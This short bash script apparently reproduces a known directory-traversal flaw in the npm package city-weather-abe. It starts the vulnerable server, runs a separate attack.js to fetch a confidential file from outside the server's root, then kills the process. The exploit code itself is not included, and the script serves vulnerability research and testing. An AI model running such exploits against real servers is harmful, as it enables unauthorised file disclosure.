#!/bin/bash
# author: Liang Gong

if [ "$(uname)" == "Darwin" ]; then
    # under Mac OS X platform
    NODE='node'       
elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
    # under GNU/Linux platform
    NODE='nodejs'
fi

# make sure the root dirctory exists
# /usr/local/src/projects/node
mkdir /usr/local/src
mkdir /usr/local/src/projects/
mkdir /usr/local/src/projects/node

cd directory-traversal/city-weather-abe

RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# start the server
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}city-weather-abe${NC}"
$NODE test.js  2>&1  &
vulnpid=$!

# wait for the server to get started
sleep 1.5s

echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"

# utilize directory traversal to get files outside the working directory
# trigger directory traversal issues: send a request to retrieve the confidential file outside the working directory
$NODE attack.js `pwd`

# kill the vulnerable npm package's process
kill -9 $vulnpid
